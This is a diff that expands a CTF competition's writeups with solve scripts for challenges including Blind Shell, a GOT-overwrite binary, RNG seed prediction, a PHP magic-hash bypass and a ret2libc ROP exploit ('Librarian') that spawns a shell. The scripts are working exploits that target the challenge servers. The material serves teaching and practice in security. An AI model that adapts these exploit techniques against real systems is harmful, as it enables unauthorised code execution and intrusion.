@@ -4,7 +4,7 @@ The following writeups were provided by the respective challenge authors
 
 ## Sanity Check Round 9
 
-Get file, go to yt link, scroll to bottom o desc, copy and submit flag
+Get file, go to Youtube link, scroll to bottom of desc, copy and submit flag
 
 ## Rotations
 
@@ -80,7 +80,36 @@ We're given all the parameters (the modulus is prime so no factoring needed), so
 
 ## Blind Shell
 
-Pipe command output (e.g. ls) into grep to check for presence/absence of characters.
+Pipe command output (e.g. ls) into grep to check for presence/absence of characters. Then bruteforce character by character. 
+
+```python
+from pwn import *
+
+alphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!"#()+,-/:<=>?@[]^'
+
+conn = remote('oreos.ctfchallenge.ga', '12345')
+conn.sendline("cat flag.txt | grep ictf{")
+conn.recvline()
+
+flag = 'ictf{'
+
+while True:
+    for i in alphabet:
+        test = flag + i
+        print(test)
+        conn.sendline("cat flag.txt | grep " + test)
+        r = conn.recvline()
+        print(r)
+        print(chr(r[4]))
+        if chr(r[4]) == 'S':
+            flag = test
+            break
+
+    if flag[-1] == '}':
+        break
+
+print("Here's your flag: ", flag)
+```
 
 ## Look-For-It
 
@@ -104,6 +133,20 @@ Now, we can replace the line(which generates sequence and checks for primality) 
 
 When we decompile, we notice that the program lets us write a value to memory, then calls puts() on a string "OK. Thanks! I hope you dont pop any $(sh)ells!". The "$(sh)" seems suspicious, and it looks like bash. So, we run this in bash, and it lets us execute commands. (even though we can only see stderr) So, our goal is to call system() on this string. We overwrite the GOT to do this. For the address to write to, put in 4210712, the address of the GOT entry for puts(). For the address of system, we put 4198560, the address of system() in the PLT. Then, we have a shell, even though we cannot see the output of our commands. To circumvent this, we enter in "bash 1>&2" and we are now able to run commands and see their output. Run "cat flag.txt" to get the flag.
 
+```python
+from pwn import *
+
+conn = remote("stephencurry.ctfchallenge.ga", 5001)
+elf = ELF("./goat")
+
+conn.recvuntil("?")
+conn.sendline("4210712") # puts() GOT, in decimal form
+conn.recvuntil("?")
+conn.sendline("4198560") # system() PLT, in decimal form
+conn.sendline("bash 1>&2")
+conn.interactive()
+```
+
 ## What's a database
 
 We can attach the flag database into our own in-memory database and copy over the table into the `whatsthis` table the challenge needs:
@@ -112,11 +155,11 @@ We can attach the flag database into our own in-memory database and copy over th
 
 ## Overlooked
 
-Extract the zip, use zero-width steganography decrypt on the text file to get the password `thisisthepasswordforthefilebutinzwspglhf`. Then use steghide to extract a zlib file out. Use zlib-flate to uncompress the file, to get the image with the flag.
+Extract the zip, use zero-width steganography (https://330k.github.io/misc_tools/unicode_steganography.html with all boxes checked) decrypt on the text file to get the password `thisisthepasswordforthefilebutinzwspglhf`. Then use steghide to extract a zlib file out. Use zlib-flate to uncompress the file, to get the image with the flag.
 
 ## Little
 
-Convert the endianness from little endian.
+Convert the endianness from little endian. Remove the padding at the end after the `}`.
 
 ## vnpack
 
@@ -178,6 +221,27 @@ Read the figlet which translates ascii to ascii word art, and reply to the serve
 
 Try times near the current time until one matches the given random number, then use that seed.
 
+```python
+from pwn import *
+import time
+
+conn = remote('oreos.ctfchallenge.ga', 7331)
+conn.recvuntil(":")
+
+base = round(time.time(), 2)
+check = int(conn.recvline().decode())
+
+for n in range(-1000,1000):
+  random.seed(round(base+n/100,2))
+  if random.randint(0, 1000000000) == check:
+    break
+
+conn.sendline(str(random.randint(0, 1000000000)))
+conn.sendline(str(random.randint(0, 1000000000)))
+conn.sendline(str(random.randint(0, 1000000000)))
+print(conn.recvall().decode())
+```
+
 ## Fake crypto
 
 PHP is a weird language.
@@ -190,6 +254,8 @@ the strings as numbers, and successfully does so, thinking they represent `0 * 1
 With some brute force to search for md5 hashes of this form, we can fairly quickly
 find a "collision".
 This phenomenon is also known as a *magic* hash in PHP.
+
+Cheese solution: `?a[]=0&b[]=1`
 
 ## When is it?
 
@@ -205,7 +271,77 @@ Most of the trickery is involved in making sure that all sessions have an indivi
 
 ## Librarian
 
-Annotated solve script at https://imaginary.ml/r/0F18-librarian.py
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import binascii
+
+# we are given the binary
+elf = ELF("./librarian")
+
+# we leak libc with the below steps multiple times with different functions
+# and then download it from https://libc.rip
+libc = ELF('./libc.so.6')
+
+# gadgets for args (it's 64 bit)
+pop_rdi = 0x0000000000401443
+ret = 0x000000000040101a
+
+#conn = process("./librarian")
+# connect to the server
+conn = remote("stephencurry.ctfchallenge.ga", 5003)
+
+# rand() is called without srand(), so our seed is 0.
+# The password will always be the same
+conn.sendline("1804289383")
+conn.sendline("42") #some number that isn't 1-5 will trigger the error prompt
+
+conn.recvuntil("to our library.")
+
+# Time to leak a libc address!
+payload = b'A'*568 # offset to the overflow var
+payload += p64(pop_rdi) # rdi is for the first arg
+payload += p64(elf.got['puts']) # first arg is the GOT entry of puts, points to puts in libc
+payload += p64(elf.plt['puts']) # calls puts()
+payload += p64(elf.symbols['main']) # calls main() after puts is run
+conn.sendline(payload) # send this payload
+
+# extra lines
+conn.recvline()
+conn.recvline()
+
+# recieve our leak, accounting for endianness
+puts_libc = int(binascii.hexlify(conn.recvline()[::-1]).replace(b'0a', b'').decode(), 16)
+
+log.info("puts() libc: " + hex(puts_libc))
+
+libc.address = puts_libc - libc.symbols['puts'] # find the libc base
+bin_sh = next(libc.search(b"/bin/sh")) # find the address of /bin/sh in libc
+system_libc = libc.symbols['system'] # find the address of system() in libc
+
+log.info("libc base: " + hex(libc.address))
+log.info("system(): " + hex(system_libc))
+log.info("/bin/sh: " + hex(bin_sh))
+
+conn.sendline("846930886") # second random number with seed 0
+conn.sendline("42") # bring up the error / asking for feedback
+conn.recvuntil("to our library.")
+
+payload = b'A'*568
+payload += p64(ret) # stack alignment :(
+payload += p64(pop_rdi) # load first arg
+payload += p64(bin_sh) # address of /bin/sh in libc
+payload += p64(system_libc) # address of system() in libc
+conn.sendline(payload)
+
+conn.recvuntil("!")
+conn.recvline()
+
+log.info("You should have a shell now... ")
+conn.interactive() # WE GET A SHELL!!!!!
+
+```
 
 ## Ropsten
 
